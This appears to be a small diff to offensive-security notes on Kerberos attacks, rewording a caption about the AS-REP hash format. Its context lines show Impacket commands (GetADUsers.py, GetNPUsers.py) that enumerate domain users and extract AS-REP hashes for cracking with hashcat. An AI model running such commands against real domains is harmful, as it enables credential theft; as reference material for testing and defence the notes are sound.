@@ -180,7 +180,7 @@ GetADUsers.py jaki.local/someuser:somepassword -k -dc-ip dc.jaki.local -all --de
 python GetNPUsers.py JAKI/ -usersfile /tmp/users.txt -format hashcat -dc-ip 10.10.1.1
 ```
 
-TGT upload format can be as follows:
+AS-REP encrypt part in KRB_AS_REP format can be as follows:
 
 ```
 $krb5asrep$23$ - RC4
